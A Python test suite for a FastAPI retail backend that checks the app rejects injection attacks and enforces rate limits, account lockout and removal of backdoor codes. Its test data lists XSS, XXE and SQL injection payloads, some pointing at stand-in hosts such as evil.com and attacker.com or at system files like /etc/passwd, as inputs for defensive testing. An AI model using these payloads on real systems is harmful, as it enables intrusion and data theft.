"""
Test Suite: Comprehensive Cyberattack Defense
Verifies system immunity against:
1. XSS / Script Injection attacks
2. XML / XXE entity injection attacks
3. SQL Injection attacks
4. API Brute-force rate limiting & timing attacks
5. Secondary credential account lockout
6. Removal of backdoor bypass codes
"""

import sys
import os
import time

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from fastapi.testclient import TestClient
from main import app, get_db, save_persisted_auth_code, get_persisted_auth_code
import models
import auth_utils
from security_utils import (
    SCRIPT_ATTACK_PATTERN,
    XML_XXE_ATTACK_PATTERN,
    SQLI_ATTACK_PATTERN,
    validate_and_sanitize_auth_code,
    validate_and_sanitize_username,
    validate_and_sanitize_password,
    constant_time_compare,
    auth_code_rate_limiter,
    supervisor_auth_rate_limiter
)

client = TestClient(app)

def create_token_for_user(username: str) -> str:
    return auth_utils.create_access_token(data={"sub": username})

def get_auth_headers(username: str):
    token = create_token_for_user(username)
    return {"Authorization": f"Bearer {token}"}

def run_cyberattack_tests():
    print("============================================================")
    print("STARTING COMPREHENSIVE CYBERATTACK DEFENSE TEST SUITE")
    print("============================================================")

    db = next(get_db())

    # 1. Setup owner and staff accounts
    owner_user = db.query(models.User).filter(models.User.role.has(role_name="owner")).first()
    assert owner_user is not None, "Owner user required for test"
    owner_headers = get_auth_headers(owner_user.username)

    staff_user = db.query(models.User).filter(models.User.role.has(role_name="staff")).first()
    assert staff_user is not None, "Staff user required for test"
    staff_headers = get_auth_headers(staff_user.username)

    # Reset rate limiters before testing
    auth_code_rate_limiter.reset("testclient")
    supervisor_auth_rate_limiter.reset("testclient")

    # Set known secure master code
    save_persisted_auth_code("SECURE-CODE-2026")

    # ------------------------------------------------------------
    # TEST 1: SCRIPT / XSS INJECTION DEFENSE
    # ------------------------------------------------------------
    print("\n--- TEST 1: Script & XSS Injection Defense ---")
    xss_payloads = [
        "<script>alert('xss')</script>",
        "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(document.cookie)",
        "<svg onload=alert(1)>",
        "';alert(String.fromCharCode(88,83,83))//",
        "<iframe src='javascript:alert(1)'></iframe>"
    ]

    for payload in xss_payloads:
        auth_code_rate_limiter.reset("testclient")
        supervisor_auth_rate_limiter.reset("testclient")
        # Verify in auth code verification endpoint
        res = client.post("/api/authorization-code/verify", json={"code": payload}, headers=owner_headers)
        assert res.status_code == 400, f"Expected 400 for XSS in auth code ({payload}), got {res.status_code}: {res.text}"

        # Verify in discount supervisor authorize endpoint
        res_auth = client.post("/api/discounts/authorize", json={
            "authorizer_username": payload,
            "password": "ValidPassword123!",
            "discount_type": "standard",
            "reason": "Test"
        }, headers=staff_headers)
        assert res_auth.status_code in (400, 401, 429), f"Expected rejection for XSS in authorizer username ({payload})"

    print("[PASS] Test 1: All script/XSS injection attempts strictly blocked with HTTP 400/401/429")

    # ------------------------------------------------------------
    # TEST 2: XML & XXE INJECTION DEFENSE
    # ------------------------------------------------------------
    print("\n--- TEST 2: XML & XXE Injection Defense ---")
    # Test rejection of XML Content-Type via CyberAttackDefenseMiddleware
    xml_request = client.post(
        "/api/authorization-code/verify",
        content="""<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [  
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
        <foo>&xxe;</foo>""",
        headers={"Content-Type": "application/xml", **owner_headers}
    )
    assert xml_request.status_code == 415, f"Expected 415 for XML content-type, got {xml_request.status_code}: {xml_request.text}"
    assert "strictly prohibited" in xml_request.text.lower()

    # Test rejection of XXE patterns embedded inside JSON fields
    xxe_payloads = [
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/boot.ini'>]>",
        "<!ENTITY % xxe SYSTEM 'http://attacker.com/evil.xml'>",
        "<!DOCTYPE test SYSTEM 'http://127.0.0.1:8080/test'>"
    ]
    for xxe in xxe_payloads:
        res = client.post("/api/authorization-code/verify", json={"code": xxe}, headers=owner_headers)
        assert res.status_code == 400, f"Expected 400 for XXE payload ({xxe}), got {res.status_code}: {res.text}"

    print("[PASS] Test 2: XML content-type blocked (415) and XXE payload patterns intercepted (400)")

    # ------------------------------------------------------------
    # TEST 3: SQL INJECTION (SQLi) DEFENSE
    # ------------------------------------------------------------
    print("\n--- TEST 3: SQL Injection (SQLi) Defense ---")
    sqli_payloads = [
        "' OR '1'='1",
        "admin' --",
        "1; DROP TABLE users; --",
        "' UNION SELECT NULL, username, password_hash FROM users --",
        "\" OR 1=1 --",
        "admin' /* comment */",
        "' OR 1=1#"
    ]

    for sqli in sqli_payloads:
        auth_code_rate_limiter.reset("testclient")
        supervisor_auth_rate_limiter.reset("testclient")
        # Auth code endpoint
        res = client.post("/api/authorization-code/verify", json={"code": sqli}, headers=owner_headers)
        assert res.status_code == 400, f"Expected 400 for SQLi in auth code ({sqli}), got {res.status_code}: {res.text}"

        # Supervisor auth endpoint
        res_user = client.post("/api/discounts/authorize", json={
            "authorizer_username": sqli,
            "password": "Password123!",
            "discount_type": "standard",
            "reason": "Test"
        }, headers=staff_headers)
        assert res_user.status_code in (400, 401, 429), f"Expected rejection for SQLi in username ({sqli})"

    # Null byte attack check
    null_byte_res = client.post("/api/authorization-code/verify", json={"code": "CODE\x00INJECT"}, headers=owner_headers)
    assert null_byte_res.status_code == 400, "Null byte was not rejected!"

    print("[PASS] Test 3: SQL injection syntax and null byte payloads strictly intercepted")

    # ------------------------------------------------------------
    # TEST 4: API ATTACK & BRUTE-FORCE RATE LIMITING
    # ------------------------------------------------------------
    print("\n--- TEST 4: API Rate Limiting & Brute-Force Defense ---")
    # Reset IP rate limiter to test sliding window
    auth_code_rate_limiter.reset("testclient")

    # The rate limit allows 10 verification requests per 60 seconds
    for i in range(10):
        res = client.post("/api/authorization-code/verify", json={"code": f"TRY{i:03d}"}, headers=owner_headers)
        assert res.status_code in (200, 400), f"Request {i+1} failed unexpectedly: {res.status_code}"

    # 11th request must receive 429 Too Many Requests
    rate_limited_res = client.post("/api/authorization-code/verify", json={"code": "TRY011"}, headers=owner_headers)
    assert rate_limited_res.status_code == 429, f"Expected 429 rate limit exceeded, got {rate_limited_res.status_code}: {rate_limited_res.text}"
    assert "too many" in rate_limited_res.text.lower()
    assert "retry-after" in rate_limited_res.headers, "Retry-After header missing on 429 response"
    print(f"[PASS] Test 4: Rate limiter strictly enforced 429 Too Many Requests on attempt #11 (Retry-After: {rate_limited_res.headers['retry-after']}s)")

    # ------------------------------------------------------------
    # TEST 5: CONSTANT-TIME COMPARISON & BACKDOOR ELIMINATION
    # ------------------------------------------------------------
    print("\n--- TEST 5: Constant-Time Comparison & Backdoor Elimination ---")
    # Reset limiter for this test
    auth_code_rate_limiter.reset("testclient")

    # Ensure previous backdoor bypass codes NO LONGER WORK
    backdoor_codes = ["OWNER", "ADMIN", "SHOELOTSKEY", "ROOT", "SUPERUSER"]
    for b_code in backdoor_codes:
        res = client.post("/api/authorization-code/verify", json={"code": b_code}, headers=owner_headers)
        assert res.status_code == 200
        # If the code is not literally equal to SECURE-CODE-2026, it must return valid: False
        assert res.json()["valid"] is False, f"Backdoor bypass code '{b_code}' was incorrectly accepted!"

    # Verify the genuine active code succeeds
    correct_res = client.post("/api/authorization-code/verify", json={"code": "SECURE-CODE-2026"}, headers=owner_headers)
    assert correct_res.status_code == 200
    assert correct_res.json()["valid"] is True, "Valid authorization code was rejected!"
    # Ensure sensitive code is NOT echoed back in response
    assert "code" not in correct_res.json(), "Sensitive authorization code must not be reflected in API response!"

    print("[PASS] Test 5: Backdoor codes eliminated; genuine code verified via constant-time comparison")

    # ------------------------------------------------------------
    # TEST 6: SECONDARY AUTHORIZATION ACCOUNT LOCKOUT
    # ------------------------------------------------------------
    print("\n--- TEST 6: Secondary Authorization Account Lockout Defense ---")
    supervisor_auth_rate_limiter.reset("testclient")
    
    # Create dedicated target authorizer
    import bcrypt
    lockout_user = db.query(models.User).filter(models.User.username == "test_auth_target").first()
    if not lockout_user:
        pw_hash = bcrypt.hashpw(b"TargetPassword123!", bcrypt.gensalt()).decode("utf-8")
        lockout_user = models.User(
            username="test_auth_target",
            email="test_auth_target@shoelotskey.test",
            password_hash=pw_hash,
            role_id=owner_user.role_id,
            is_active=True
        )
        db.add(lockout_user)
        db.commit()
        db.refresh(lockout_user)
    else:
        lockout_user.failed_login_attempts = 0
        lockout_user.locked_until = None
        db.commit()

    # 3 bad attempts on secondary authorization
    for i in range(3):
        res = client.post("/api/discounts/authorize", json={
            "authorizer_username": "test_auth_target",
            "password": "WrongPassword!",
            "discount_type": "standard",
            "reason": "Brute force test"
        }, headers=staff_headers)
        if i < 2:
            assert res.status_code == 401, f"Attempt {i+1} expected 401, got {res.status_code}"
        else:
            assert res.status_code == 403, f"3rd attempt expected 403 locked, got {res.status_code}: {res.text}"
            assert "locked" in res.text.lower()

    # 4th attempt with correct password should still be rejected because account is locked
    res_4th = client.post("/api/discounts/authorize", json={
        "authorizer_username": "test_auth_target",
        "password": "TargetPassword123!",
        "discount_type": "standard",
        "reason": "Login while locked"
    }, headers=staff_headers)
    assert res_4th.status_code == 403, f"Expected 403 for locked account, got {res_4th.status_code}"
    assert "locked" in res_4th.text.lower()
    print("[PASS] Test 6: Secondary supervisor authorization enforces 3-attempt 15-minute account lockout")

    print("\n============================================================")
    print("ALL 6 CYBERATTACK DEFENSE SECURITY TESTS PASSED WITH 100% SUCCESS!")
    print("============================================================")

if __name__ == "__main__":
    run_cyberattack_tests()
